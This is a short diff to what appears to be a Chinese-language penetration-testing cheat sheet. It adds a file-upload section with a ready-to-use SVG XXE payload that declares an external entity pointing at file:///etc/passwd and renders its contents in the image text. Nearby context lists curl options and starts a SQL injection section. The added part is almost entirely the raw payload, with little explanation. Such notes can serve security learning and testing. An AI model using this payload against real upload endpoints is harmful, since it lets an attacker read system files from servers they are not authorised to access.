@@ -46,7 +46,14 @@ curl -i -L
 -i, --include       Incluude protocol response headers in the output
 -L, --location      Follow redirects
 ```
+# 文件上传
 
+## 0x3 XXE
+
+SVG XXE
+```xml
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="640px" height="480px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
 
 # SQL 注入
 
